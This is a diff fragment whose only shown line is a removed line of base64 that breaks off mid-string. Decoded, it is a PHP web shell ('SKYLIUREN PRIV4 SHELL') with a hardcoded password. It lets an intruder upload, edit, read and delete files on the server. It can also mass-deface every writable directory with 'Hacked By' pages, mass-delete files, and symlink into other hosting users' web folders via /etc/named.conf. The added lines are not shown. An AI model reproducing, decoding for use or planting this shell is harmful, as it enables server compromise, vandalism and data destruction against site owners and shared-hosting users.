@@ -1,1 +1,511 @@
-PD9waHAKIGVycm9yX3JlcG9ydGluZygwKTsKIHNlc3Npb25fc3RhcnQoKTsKICRhdXRoPSJNRU1FS0dBQ09SIjsKIGZ1bmN0aW9uIHNlcnZlcmlwKCl7CiAJJGlwMT0kX1NFUlZFUlsnU0VSVkVSX0FERFInXTsKIAkkaXAyPWdldGhvc3RieW5hbWUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKTsKIAlpZigkaXAxID09ICRpcDIpewogCQlyZXR1cm4gJGlwMTsKIAl9ZWxzZXsKIAkJcmV0dXJuICRpcDI7CiAJfQogfQogZnVuY3Rpb24gbG9naW4oKXsKIAlnbG9iYWwgJGF1dGg7CiAJZWNobyAiPHRpdGxlPlNLWUxJVVJFTiBQUklWNCB8IFNIRUxMPC90aXRsZT4KIAk8Y2VudGVyPjxicj48YnI+PGJyPjxicj4KIAk8Zm9ybSBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz4KIAlMT0dJTiBTS1lMSVVSRU4gUFJJVjQuPGJyPjxicj4KIAk8aW5wdXQgdHlwZT0ncGFzc3dvcmQnIG5hbWU9J21pbmltX3Bhc3MnIHZhbHVlPScuLi4uLic+CiAJPC9mb3JtPiI7CiAJaWYoaXNzZXQoJF9QT1NUWydtaW5pbV9wYXNzJ10pKXsKIAkJaWYoJF9QT1NUWydtaW5pbV9wYXNzJ10gPT0gJGF1dGgpewogCQkJJF9TRVNTSU9OWydhZG1pbiddID0gIlRSVUUiOwogCQkJcGluZGFoKCc/aG9tZScpOwogCQl9ZWxzZXsKIAkJCWFsZXJ0KCfFnmlmcmUgeWFubMSxxZ8gbGFhIDooJyk7CiAJCQlwaW5kYWgoJz9zYWxhaycpOwogCQl9CiAJfQogfQogZnVuY3Rpb24gd3JpdGUoJGNvbnRlbnQsJGRpcil7CiAJJGZoPWZvcGVuKCRkaXIsInciKTsKIAlpZihmd3JpdGUoJGZoLCRjb250ZW50KSl7CiAJCXJldHVybiAiMSI7CiAJfWVsc2V7CiAJCXJldHVybiAiMCI7CiAJfQogCWZjbG9zZSgkZmgpOwogfQpmdW5jdGlvbiBhdXRob3IoKXsKCXByaW50ICI8L3RhYmxlPjxjZW50ZXI+PGJyPjxicj48aDM+U0tZTElVUkVOIFBSSVY0IFNIRUxMPGJyPjxiPjwvYj48L2gzPjxociB3aWR0aD0nNTAlJz48YnI+PGJyPiI7Cn0KZnVuY3Rpb24gZGVsVHJlZSgkZGlyKXsgCiRmaWxlcyA9IGFycmF5X2RpZmYoc2NhbmRpcigkZGlyKSwgYXJyYXkoJy4nLCAnLi4nKSk7IAoJZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7IAoJCShpc19kaXIoIiRkaXIvJGZpbGUiKSkgPyBkZWxUcmVlKCIkZGlyLyRmaWxlIikgOiB1bmxpbmsoIiRkaXIvJGZpbGUiKTsgCgl9CglyZXR1cm4gcm1kaXIoJGRpcik7Cn0gCmZ1bmN0aW9uIGFsZXJ0KCRtc2cpewoJcHJpbnQgIjxzY3JpcHQ+YWxlcnQoJyIuJG1zZy4iJyk7PC9zY3JpcHQ+IjsKfQpmdW5jdGlvbiBwaW5kYWgoJGRpcil7CglwcmludCAiPHNjcmlwdD53aW5kb3cubG9jYXRpb249JyIuJGRpci4iJzs8L3NjcmlwdD4iOwp9CmlmKCRfU0VTU0lPTlsnYWRtaW4nXSA9PSAiVFJVRSIpewplY2hvICI8dGl0bGU+U0tZTElVUkVOIFNIRUxMPC90aXRsZT4KPHN0eWxlPgpAaW1wb3J0IHVybCgnaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVN1cGVybWVyY2FkbytPbmUnKTsKKiB7bWFyZ2luOiAwOyBwYWRkaW5nOiAwfQojd3JhcHBlciB7CiAgICB3aWR0aDogOTAwcHg7CiAgICBtYXJnaW46IGF1dG87CiAgICBwYWRkaW5nOiAxMHB4Owp9CmJvZHkgewogICAgYmFja2dyb3VuZDogI0Q3REFDQzsKICAgIGZvbnQtZmFtaWx5OiBhcmlhbDsKfQp0YWJsZSB0ZHsKCXBhZGRpbmc6IDhweCA4cHg7Cn0KaDEgewogICAgdGV4dC1hbGlnbjogY2VudGVyOwp9CgoudGV4dCB7CiAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CiAgICBmb250LXNpemU6IDJyZW07CiAgICB0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlOwogICAgY29sb3I6ICMyNDRENDk7CiAgICB0ZXh0LXNoYWRvdzogM3B4IDNweCAwcHggI0Q3REFDQywgOHB4IDhweCAwcHggcmdiYSgwLCAwLCAwLCAwLjEpOwp9CnRyOmhvdmVyewpiYWNrZ3JvdW5kLWNvbG9yOiBnb2xkOwp0ZXh0LXNoYWRvdzowcHggMHB4IDEwcHggIyMzMzk5MDA7Cn0KCgo8L3N0eWxlPgo8c3R5bGU+CmF7Cgljb2xvcjp3aGl0ZTsKCXRleHQtZGVjb3JhdGlvbjpub25lOwp9CmE6aG92ZXJ7Cgljb2xvcjpibHVlOwp9CiNtZW51IGF7CiAgICAgICAgcGFkZGluZzo3cHggMjlweDsKICAgICAgICBtYXJnaW46MDsKICAgICAgICBiYWNrZ3JvdW5kOiMyMjIyMjI7CiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOm5vbmU7CiAgICAgICAgbGV0dGVyLXNwYWNpbmc6MXB4OwogICAgICAgIC1tb3otYm9yZGVyLXJhZGl1czogNXB4OyAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDVweDsKIC1raHRtbC1ib3JkZXItcmFkaXVzOiA1cHg7IGJvcmRlci1yYWRpdXM6IDVweDsKfQojbWVudSBhOmhvdmVyewoJYmFja2dyb3VuZDojMTkxOTE5OwogY29sb3I6IGdvbGQ7CiBib3JkZXItYm90dG9tOjFweCBzb2xpZCAjMzMzMzMzOwogYm9yZGVyLXRvcDoxcHggc29saWQgIzMzMzMzMzsKIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwp9Cjwvc3R5bGU+CjxzdHlsZT4KCQlib2R5IHsKCQkJYmFja2dyb3VuZC1jb2xvcjogYmxhY2s7CgkJCWJhY2tncm91bmQtc2l6ZTogMTAwJSAxMDAlOwoJCQl9Cgk8L3N0eWxlPgo8IS0tPGJvZHkgYmdjb2xvcj0nZ3JlZW4nPi0tPgo8Zm9udCBjb2xvcj0nd2hpdGUnPgo8bGluayBocmVmPSdodHRwczovL3N0YWNrcGF0aC5ib290c3RyYXBjZG4uY29tL2ZvbnQtYXdlc29tZS80LjcuMC9jc3MvZm9udC1hd2Vzb21lLm1pbi5jc3MnIHJlbD0nc3R5bGVzaGVldCcgdHlwZT0ndGV4dC9jc3MnPgo8Y2VudGVyPiI7CiRkaXI9JF9HRVRbJ2RpciddOwppZighJGRpcil7CgkkZGlyPWdldGN3ZCgpOwp9CmVjaG8gIjxkaXYgaWQ9J3dyYXBwZXInPgogICAgICAgIDxoMSBjbGFzcz0ndGV4dCc+eyBTS1lMSVVSRU4gUFJJVjQgfTwvaDE+CiAgICA8L2Rpdj4KICAgIDxociB3aWR0aD0nMzAlJz4KICAgIDxicj48YnI+CjwvY2VudGVyPgo8aSBjbGFzcz0nZmEgZmEtaGRkLW8nPjwvaT4gIi5waHBfdW5hbWUoKS4iPGJyPgo8aSBjbGFzcz0nZmEgZmEtZGVza3RvcCc+PC9pPiAiLnNlcnZlcmlwKCkuIiB8IDxpIGNsYXNzPSdmYSBmYS11c2VyJz48L2k+ICIuJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10uIjxicj4KPGkgY2xhc3M9J2ZhIGZhLWZvbGRlci1vJz48L2k+ICI7CiRhPWV4cGxvZGUoIi8iLCRkaXIpOwpmb3JlYWNoKCRhIGFzICRhYSA9PiAkYWFhKXsKCWlmKCRhYWEgPT0gJycgJiYgJGFhID09ICcwJyl7CgkJZWNobyAiPGEgaHJlZj0nP2Rpcj0vJz4vPC9hPiI7CgkJY29udGludWU7Cgl9ZWxzZWlmKCRhYWEgPT0gJycpewoJCWNvbnRpbnVlOwoJfWVsc2V7CgkJZWNobyAiPGEgaHJlZj0nP2Rpcj0iOwoJCWZvcigkaT0wOyRpPD0kYWE7JGkrKyl7CgkJCWVjaG8gJGFbJGldLiIvIjsKCQl9CgkJZWNobyAiJz4kYWFhPC9hPi8iOwoJfQp9CmVjaG8gIjxicj48YnI+CjxhIGhyZWY9Jz9ob21lJz5Ib21lPC9hPiB8IDxhIGhyZWY9Jz9uZiZkaXI9JGRpcic+K0ZpbGU8L2E+IHwgPGEgaHJlZj0nP25kJmRpcj0kZGlyJz4rRGlyPC9hPiB8IDxhIGhyZWY9Jz9leGl0Jz5FeGl0PC9hPjxicj4iOwoKCiRmaWxlcyA9ICRfRklMRVNbJ3Z1bG5maWxlJ11bJ25hbWUnXTsKCSRkZXN0ID0gJGRpci4nLycuJGZpbGVzOwoJaWYoaXNzZXQoJF9QT1NUWyd1cGxvYWQnXSkpIHsKCSAgICBpZihpc193cml0YWJsZSgkcm9vdCkpIHsKCSAgICAgICAgaWYoQGNvcHkoJF9GSUxFU1sndnVsbmZpbGUnXVsndG1wX25hbWUnXSwgJGRlc3QpKSB7CgkgICAgICAgICAgICAkd2ViID0gImh0dHA6Ly8iLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iLyI7CgkgICAgICAgICAgICBlY2hvICI8aCBzdHlsZT0nY29sb3I6IGdyZWVuOyc+IFVwbG9hZCBTdWNjZXNzZnVsPC9oPiI7CgkgICAgICAgIH0gZWxzZSB7CgkgICAgICAgICAgICBlY2hvICI8aCBzdHlsZT0nY29sb3I6IGdyZWVuOyc+IFVwbG9hZCBGYWlsZWQ8L2g+IjsKCSAgICAgICAgfQoJICAgIH0gZWxzZSB7CgkgICAgICAgIGlmKEBjb3B5KCRfRklMRVNbJ3Z1bG5maWxlJ11bJ3RtcF9uYW1lJ10sICRkZXN0KSkgewoJICAgICAgICAgICAgZWNobyAiPGggc3R5bGU9J2NvbG9yOiBncmVlbjsnPiBVcGxvYWQgU3VjY2Vzc2Z1bDwvaD4iOwoJICAgICAgICB9IGVsc2UgewoJICAgICAgICAgICAgZWNobyAiPGggc3R5bGU9J2NvbG9yOiBncmVlbjsnPiBVcGxvYWQgRmFpbGVkPC9oPiI7CgkgICAgICAgIH0KCSAgICB9Cgl9CgoKCmlmKGlzc2V0KCRfR0VUWyduZiddKSl7CgllY2hvICIKCTxmb3JtIGFjdGlvbj0nP25mJmRpcj0kZGlyJyBtZXRob2Q9J1BPU1QnPgoJTmV3IEZpbGUgOiA8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nZm5hbWUnPgoJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nZm9rJyB2YWx1ZT0nRG9uZSc+Cgk8L2Zvcm0+IjsKCWlmKCRfUE9TVFsnZm9rJ10pewoJCXBpbmRhaCgiP2VkaXQ9JGRpci8iLiRfUE9TVFsnZm5hbWUnXS4iJmRpcj0kZGlyIik7Cgl9Cn1lbHNlaWYoaXNzZXQoJF9HRVRbJ25kJ10pKXsKCWVjaG8gIgoJPGZvcm0gYWN0aW9uPSc/bmQmZGlyPSRkaXInIG1ldGhvZD0nUE9TVCc+CglOZXcgRGlyIDogPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2ZuYW1lJz4KCTxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2ZvaycgdmFsdWU9J0RvbmUnPgoJPC9mb3JtPiI7CglpZigkX1BPU1RbJ2ZvayddKXsKCQlpZihta2RpcigiJGRpci8iLiRfUE9TVFsnZm5hbWUnXS4iIikpewoJCQllY2hvICJzdWNjZXNzZnVsbHkgY3JlYXRlZCI7CgkJfWVsc2V7CgkJCWVjaG8gIkZhaWxlZCI7CgkJfQoKCX0KfWVsc2VpZihpc3NldCgkX0dFVFsnZGVsZiddKSl7CglpZihkZWxUcmVlKCRfR0VUWydkZWxmJ10pKXsKCQlwaW5kYWgoIj9kaXI9JGRpciIpOwoJfWVsc2V7CgkJYWxlcnQoJ0ZhaWxlZC4nKTsKCX0KfWVsc2VpZihpc3NldCgkX0dFVFsncmVuZiddKSl7Cgkkbm93PSRfR0VUWydyZW5mJ107CgllY2hvICIKCTxmb3JtIGFjdGlvbj0nP3JlbmY9JG5vdyZkaXI9JGRpcicgbWV0aG9kPSdQT1NUJz4KCU5ldyBOYW1lIDogPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2ZuYW1lJz4KCTxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2ZvaycgdmFsdWU9J0RvbmUnPgoJPC9mb3JtPiI7CglpZihpc3NldCgkX1BPU1RbJ2ZvayddKSl7CgkJJG5ldz0kX1BPU1RbJ2ZuYW1lJ107CgkJaWYocmVuYW1lKCRub3csIiRkaXIvJG5ldyIpKXsKCQkJZWNobyAiPGNlbnRlcj5SZW5hbWUgU3VjY2Vzc2Z1bGx5PGNlbnRlcj4iOwoJCX1lbHNlewoJCQllY2hvICI8Y2VudGVyPlJlbmFtZSBGYWlsZWQ8Y2VudGVyPjxjZW50ZXI+IjsKCQl9Cgl9Cn1lbHNlaWYoaXNzZXQoJF9HRVRbJ2RlbCddKSl7CglpZih1bmxpbmsoJF9HRVRbJ2RlbCddKSl7CgkJLy9hbGVydCgiRGVsZXRlIFN1Y2Nlc3NmdWxseSIpOwoJCWVjaG8gIjxjZW50ZXI+RGVsZXRlIFN1Y2Nlc3NmdWxseTwvY2VudGVyPiI7Cgl9ZWxzZXsKCQkvL2FsZXJ0KCJGYWlsZWQiKTsKCQllY2hvICI8Y2VudGVyPkRlbGV0ZSBGYWlsZWQ8L2NlbnRlcj4iOwoKCX0KfWVsc2VpZihpc3NldCgkX0dFVFsnZXhpdCddKSl7CglzZXNzaW9uX2Rlc3Ryb3koKTsKCXBpbmRhaCgnP2hvbWUnKTsKfWVsc2VpZihpc3NldCgkX0dFVFsnZWRpdCddKSl7Cgkkc2F2ZT0kX0dFVFsnZWRpdCddOwoJJGNvbnQ9aHRtbHNwZWNpYWxjaGFycyhmaWxlX2dldF9jb250ZW50cygkc2F2ZSkpOwoJZWNobyAiPGZvcm0gYWN0aW9uPSc/ZWRpdD0kc2F2ZSYkZGlyPSRkaXInIG1ldGhvZD0nUE9TVCc+Cgk8Y2VudGVyPjx0ZXh0YXJlYSBuYW1lPSdmY29udCcgY29scz0xMDAlIHJvd3M9MzAlPiRjb250PC90ZXh0YXJlYT48YnI+PGJyPgoJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ncGF1c2lnYW50ZW5nJyB2YWx1ZT0nPDw8PDw8PDxbIFNhdmUgRmlsZSBdPj4+Pj4+Pj4nPjwvY2VudGVyPgoJPC9mb3JtPjxicj48YnI+IjsKCWF1dGhvcigpOwoJaWYoaXNzZXQoJF9QT1NUWydwYXVzaWdhbnRlbmcnXSkpewoJCWlmKHdyaXRlKCRfUE9TVFsnZmNvbnQnXSwkc2F2ZSkgPT0gIjEiKXsKCQkJZWNobyAiPGgzPkVkaXQgU3VjY2Vzc2Z1bGx5PC9oMz4iOwoJCQlhbGVydCgnRWRpdCBTdWNjZXNzZnVsbHkuJyk7CgkJfWVsc2V7CgkJCWFsZXJ0KCdGYWlsZWQuJyk7CgkJCWVjaG8oJ0ZhaWxlZC4nKTsKCQl9Cgl9Cn1lbHNlaWYoJF9HRVRbJ21hc3MnXSA9PSAnZGVmYWNlJyl7IC8vbWFzcyBkZWZhY2UKCWZ1bmN0aW9uIG1hc3Nfa2FiZWgoJGRpciwkbmFtYWZpbGUsJGlzaV9zY3JpcHQpIHsKCQlpZihpc193cml0YWJsZSgkZGlyKSkgewoJCQkkZGlyYSA9IHNjYW5kaXIoJGRpcik7CgkJCWZvcmVhY2goJGRpcmEgYXMgJGRpcmIpIHsKCQkJCSRkaXJjID0gIiRkaXIvJGRpcmIiOwoJCQkJJGxva2FzaSA9ICRkaXJjLicvJy4kbmFtYWZpbGU7CgkJCQlpZigkZGlyYiA9PT0gJy4nKSB7CgkJCQkJZmlsZV9wdXRfY29udGVudHMoJGxva2FzaSwgJGlzaV9zY3JpcHQpOwoJCQkJfSBlbHNlaWYoJGRpcmIgPT09ICcuLicpIHsKCQkJCQlmaWxlX3B1dF9jb250ZW50cygkbG9rYXNpLCAkaXNpX3NjcmlwdCk7CgkJCQl9IGVsc2UgewoJCQkJCWlmKGlzX2RpcigkZGlyYykpIHsKCQkJCQkJaWYoaXNfd3JpdGFibGUoJGRpcmMpKSB7CgkJCQkJCQllY2hvICJbPGZvbnQgY29sb3I9IzE4QkM5Qz5ET05FPC9mb250Pl0gJGxva2FzaTxicj4iOwoJCQkJCQkJZmlsZV9wdXRfY29udGVudHMoJGxva2FzaSwgJGlzaV9zY3JpcHQpOwoJCQkJCQkJJGlkeCA9IG1hc3Nfa2FiZWgoJGRpcmMsJG5hbWFmaWxlLCRpc2lfc2NyaXB0KTsKCQkJCQkJfQoJCQkJCX0KCQkJCX0KCQkJfQoJCX0KCX0KCWZ1bmN0aW9uIG1hc3NfYmlhc2EoJGRpciwkbmFtYWZpbGUsJGlzaV9zY3JpcHQpIHsKCQlpZihpc193cml0YWJsZSgkZGlyKSkgewoJCQkkZGlyYSA9IHNjYW5kaXIoJGRpcik7CgkJCWZvcmVhY2goJGRpcmEgYXMgJGRpcmIpIHsKCQkJCSRkaXJjID0gIiRkaXIvJGRpcmIiOwoJCQkJJGxva2FzaSA9ICRkaXJjLicvJy4kbmFtYWZpbGU7CgkJCQlpZigkZGlyYiA9PT0gJy4nKSB7CgkJCQkJZmlsZV9wdXRfY29udGVudHMoJGxva2FzaSwgJGlzaV9zY3JpcHQpOwoJCQkJfSBlbHNlaWYoJGRpcmIgPT09ICcuLicpIHsKCQkJCQlmaWxlX3B1dF9jb250ZW50cygkbG9rYXNpLCAkaXNpX3NjcmlwdCk7CgkJCQl9IGVsc2UgewoJCQkJCWlmKGlzX2RpcigkZGlyYykpIHsKCQkJCQkJaWYoaXNfd3JpdGFibGUoJGRpcmMpKSB7CgkJCQkJCQllY2hvICJbPGZvbnQgY29sb3I9IzE4QkM5Qz5ET05FPC9mb250Pl0gJGRpcmIvJG5hbWFmaWxlPGJyPiI7CgkJCQkJCQlmaWxlX3B1dF9jb250ZW50cygkbG9rYXNpLCAkaXNpX3NjcmlwdCk7CgkJCQkJCX0KCQkJCQl9CgkJCQl9CgkJCX0KCQl9Cgl9CglpZigkX1BPU1RbJ3N0YXJ0J10pIHsKCQlpZigkX1BPU1RbJ3RpcGUnXSA9PSAnbWFzc2FsJykgewoJCQllY2hvICI8ZGl2IHN0eWxlPSdtYXJnaW46IDVweCBhdXRvOyBwYWRkaW5nOiA1cHgnPiI7CgkJCW1hc3Nfa2FiZWgoJF9QT1NUWydkX2RpciddLCAkX1BPU1RbJ2RfZmlsZSddLCAkX1BPU1RbJ3NjcmlwdCddKTsKCQkJZWNobyAiPC9kaXY+IjsKCQl9IGVsc2VpZigkX1BPU1RbJ3RpcGUnXSA9PSAnYmlhc2EnKSB7CgkJCWVjaG8gIjxkaXYgc3R5bGU9J21hcmdpbjogNXB4IGF1dG87IHBhZGRpbmc6IDVweCc+IjsKCQkJbWFzc19iaWFzYSgkX1BPU1RbJ2RfZGlyJ10sICRfUE9TVFsnZF9maWxlJ10sICRfUE9TVFsnc2NyaXB0J10pOwoJCQllY2hvICI8L2Rpdj4iOwoJCX0KCQllY2hvICI8YSBocmVmPSc/Jz48LSBrZW1iYWxpPC9hPiI7Cgl9IGVsc2UgewoJZWNobyAiPGNlbnRlcj4iOwoJZWNobyAiPGZvcm0gbWV0aG9kPSdwb3N0Jz4KCTxmb250IHN0eWxlPSd0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsnPlRpcGU6PC9mb250Pjxicj4KCTxpbnB1dCB0eXBlPSdyYWRpbycgbmFtZT0ndGlwZScgdmFsdWU9J2JpYXNhJyBjaGVja2VkPkJpYXNhPGlucHV0IHR5cGU9J3JhZGlvJyBuYW1lPSd0aXBlJyB2YWx1ZT0nbWFzc2FsJz5NYXNzYWw8YnI+PGJyPgoJPGZvbnQgc3R5bGU9J3RleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyc+RGlyOjwvZm9udD48YnI+Cgk8aW5wdXQgdHlwZT0ndGV4dCcgbmFtZT0nZF9kaXInIHZhbHVlPSckZGlyJyBzdHlsZT0nd2lkdGg6IDQ1MHB4OycgaGVpZ2h0PScxMCc+PGJyPgoJPGZvbnQgc3R5bGU9J3RleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyc+RmlsZW5hbWU6PC9mb250Pjxicj4KCTxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkX2ZpbGUnIHZhbHVlPSdpbmRleC5waHAnIHN0eWxlPSd3aWR0aDogNDUwcHg7JyBoZWlnaHQ9JzEwJz48YnI+Cgk8Zm9udCBzdHlsZT0ndGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7Jz5JbmRleCBGaWxlOjwvZm9udD48YnI+Cgk8dGV4dGFyZWEgbmFtZT0nc2NyaXB0JyBzdHlsZT0nd2lkdGg6IDQ1MHB4OyBoZWlnaHQ6IDIwMHB4Oyc+SGFja2VkIEJ5IFNLWUxJVVJFTjwvdGV4dGFyZWE+PGJyPgoJPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nc3RhcnQnIHZhbHVlPSdTdGFydCEnIHN0eWxlPSd3aWR0aDogNDUwcHg7JyBjbGFzcz0nYnRuIGJ0bi1zdWNjZXNzIGJ0bi1zbSc+Cgk8L2Zvcm0+IjsKCgl9Cn1lbHNlaWYoJF9HRVRbJ21hc3MnXSA9PSAnZGVsZXRlJykgewoJZnVuY3Rpb24gaGFwdXNfbWFzc2FsKCRkaXIsJG5hbWFmaWxlKSB7CgkJaWYoaXNfd3JpdGFibGUoJGRpcikpIHsKCQkJJGRpcmEgPSBzY2FuZGlyKCRkaXIpOwoJCQlmb3JlYWNoKCRkaXJhIGFzICRkaXJiKSB7CgkJCQkkZGlyYyA9ICIkZGlyLyRkaXJiIjsKCQkJCSRsb2thc2kgPSAkZGlyYy4nLycuJG5hbWFmaWxlOwoJCQkJaWYoJGRpcmIgPT09ICcuJykgewoJCQkJCWlmKGZpbGVfZXhpc3RzKCIkZGlyLyRuYW1hZmlsZSIpKSB7CgkJCQkJCXVubGluaygiJGRpci8kbmFtYWZpbGUiKTsKCQkJCQl9CgkJCQl9IGVsc2VpZigkZGlyYiA9PT0gJy4uJykgewoJCQkJCWlmKGZpbGVfZXhpc3RzKCIiLmRpcm5hbWUoJGRpcikuIi8kbmFtYWZpbGUiKSkgewoJCQkJCQl1bmxpbmsoIiIuZGlybmFtZSgkZGlyKS4iLyRuYW1hZmlsZSIpOwoJCQkJCX0KCQkJCX0gZWxzZSB7CgkJCQkJaWYoaXNfZGlyKCRkaXJjKSkgewoJCQkJCQlpZihpc193cml0YWJsZSgkZGlyYykpIHsKCQkJCQkJCWlmKGZpbGVfZXhpc3RzKCRsb2thc2kpKSB7CgkJCQkJCQkJZWNobyAiWzxmb250IGNvbG9yPSMxOEJDOUM+REVMRVRFRDwvZm9udD5dICRsb2thc2k8YnI+IjsKCQkJCQkJCQl1bmxpbmsoJGxva2FzaSk7CgkJCQkJCQkJJGlkeCA9IGhhcHVzX21hc3NhbCgkZGlyYywkbmFtYWZpbGUpOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQl9CgkJfQoJfQoJaWYoJF9QT1NUWydzdGFydCddKSB7CgkJZWNobyAiPGRpdiBzdHlsZT0nbWFyZ2luOiA1cHggYXV0bzsgcGFkZGluZzogNXB4Jz4iOwoJCWhhcHVzX21hc3NhbCgkX1BPU1RbJ2RfZGlyJ10sICRfUE9TVFsnZF9maWxlJ10pOwoJCWVjaG8gIjwvZGl2PiI7CgkJZWNobyAiPGEgaHJlZj0nPyc+PC0ga2VtYmFsaTwvYT4iOwoJfSBlbHNlIHsKCWVjaG8gIjxjZW50ZXI+IjsKCWVjaG8gIjxmb3JtIG1ldGhvZD0ncG9zdCc+Cgk8Zm9udCBzdHlsZT0ndGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7Jz5EaXI6PC9mb250Pjxicj4KCTxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkX2RpcicgdmFsdWU9JyRkaXInIHN0eWxlPSd3aWR0aDogNDUwcHg7JyBoZWlnaHQ9JzEwJz48YnI+Cgk8Zm9udCBzdHlsZT0ndGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7Jz5GaWxlbmFtZTo8L2ZvbnQ+PGJyPgoJPGlucHV0IHR5cGU9J3RleHQnIG5hbWU9J2RfZmlsZScgdmFsdWU9J2luZGV4LnBocCcgc3R5bGU9J3dpZHRoOiA0NTBweDsnIGhlaWdodD0nMTAnPjxicj4KCTxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3N0YXJ0JyB2YWx1ZT0nR29vIScgc3R5bGU9J3dpZHRoOiA0NTBweDsnPgoJPC9mb3JtPiI7Cgl9Cn1lbHNlaWYoaXNzZXQoJF9HRVRbJ3N5bSddKSkgewoJaWYgKCFpc19maWxlKCduYW1lZC50eHQnKSkgewoJCQkJCgkJCQkkZDAwbSA9IEBmaWxlKCIvZXRjL25hbWVkLmNvbmYiKTsKCQkJCQoJCQl9IGVsc2UgewoJCQkJCgkJCQkkZDAwbSA9IEBmaWxlKCJuYW1lZC50eHQiKTsKCQkJCQoJCQkJCgkJCX0KCQkJaWYgKCEkZDAwbSkgewoJCQkJCgkJCQlkaWUoIjxtZXRhIGh0dHAtZXF1aXY9J3JlZnJlc2gnIGNvbnRlbnQ9JzA7IHVybD0/c3dzPXJlYWQnLz4iKTsKCQkJfSBlbHNlIHsKCQkJCWVjaG8gIjxjZW50ZXI+PGRpdiBjbGFzcz0ndG1wJz48dGFibGUgYWxpZ249J2NlbnRlcicgd2lkdGg9JzQwJScgYmdjb2xvcj0nd2hpdGUnPjx0ZD5Eb21haW5zPC90ZD48dGQ+VXNlcnM8L3RkPjx0ZD5zeW1saW5rIDwvdGQ+IjsKCQkJCWZvcmVhY2ggKCRkMDBtIGFzICRkb20pIHsKCQkJCQkKCQkJCQlpZiAoZXJlZ2koInpvbmUiLCAkZG9tKSkgewoJCQkJCQkKCQkJCQkJcHJlZ19tYXRjaF9hbGwoJyN6b25lICIoLiopIiMnLCAkZG9tLCAkZG9tc3dzKTsKCQkJCQkJCgkJCQkJCWZsdXNoKCk7CgkJCQkJCQoJCQkJCQlpZiAoc3RybGVuKHRyaW0oJGRvbXN3c1sxXVswXSkpID4gMikgewoJCQkJCQkJCgkJCQkJCQkkdXNlciA9IHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoIi9ldGMvdmFsaWFzZXMvIiAuICRkb21zd3NbMV1bMF0pKTsKCQkJCQkJCQoJCQkJCQkJZmx1c2goKTsKCQkJCQkJCQoJCQkJCQkJCgkJCQkJCQkKCQkJCQkJCSRzaXRlID0gJHVzZXJbJ25hbWUnXTsKCQkJCQkJCQoJCQkJCQkJCgkJCQkJCQlAc3ltbGluaygiLyIsICJzeW0vcm9vdCIpOwoJCQkJCQkJCgkJCQkJCQkkc2l0ZSA9ICRkb21zd3NbMV1bMF07CgkJCQkJCQkKCQkJCQkJCSRpciA9ICdpcic7CgkJCQkJCQkKCQkJCQkJCSRpbCA9ICdpbCc7CgkJCQkJCQkKCQkJCQkJCWlmIChwcmVnX21hdGNoKCIvLl4kaXIvIiwgJGRvbXN3c1sxXVswXSkgb3IgcHJlZ19tYXRjaCgiLy5eJGlsLyIsICRkb21zd3NbMV1bMF0pKSB7CgkJCQkJCQkJJHNpdGUgPSAiPGRpdiBzdHlsZT0nIGNvbG9yOiAjRkYwMDAwIDsgdGV4dC1zaGFkb3c6IDBweCAwcHggMXB4IHJlZDsgJz4iIC4gJGRvbXN3c1sxXVswXSAuICI8L2Rpdj4iOwoJCQkJCQkJfQoJCQkJCQkJCgkJCQkJCQkKCQkJCQkJCWVjaG8gIgo8dHI+Cgo8dGQ+CjxkaXYgY2xhc3M9J2RvbSc+PGEgdGFyZ2V0PSdfYmxhbmsnIGhyZWY9aHR0cDovL3d3dy4iIC4gJGRvbXN3c1sxXVswXSAuICIvPiIgLiAkc2l0ZSAuICIgPC9hPiA8L2Rpdj4KPC90ZD4KCgo8dGQ+CiIgLiAkdXNlclsnbmFtZSddIC4gIgo8L3RkPgoKCgoKCgo8dGQ+CjxhIGhyZWY9J3N5bS9yb290L2hvbWUvIiAuICR1c2VyWyduYW1lJ10gLiAiL3B1YmxpY19odG1sJyB0YXJnZXQ9J19ibGFuayc+c3ltbGluayA8L2E+CjwvdGQ+CgoKPC90cj48L2Rpdj4gPC9jZW50ZXI+IjsKCQkJCQkJCQoJCQkJCQkJCgkJCQkJCQlmbHVzaCgpOwoJCQkJCQkJZmx1c2goKTsKCQkJCQkJCQoJCQkJCQl9CgkJCQkJfQoJCQkJfQoJCQl9CgkJCQoJCQkKCgp9ZWxzZWlmKGlzc2V0KCRfR0VUWydzcmMnXSkpewoJJGNvbnQ9JF9HRVRbJ3NyYyddOwoJcHJpbnQgIjxkaXYgc3R5bGU9J2JhY2tncm91bmQtY29sb3I6IHJlZDsnPjxwcmU+Ii5odG1sc3BlY2lhbGNoYXJzKGZpbGVfZ2V0X2NvbnRlbnRzKCRjb250KSkuIjwvcHJlPjwvZGl2PiI7Cn1lbHNlewovKiBGb3JtIGZpbG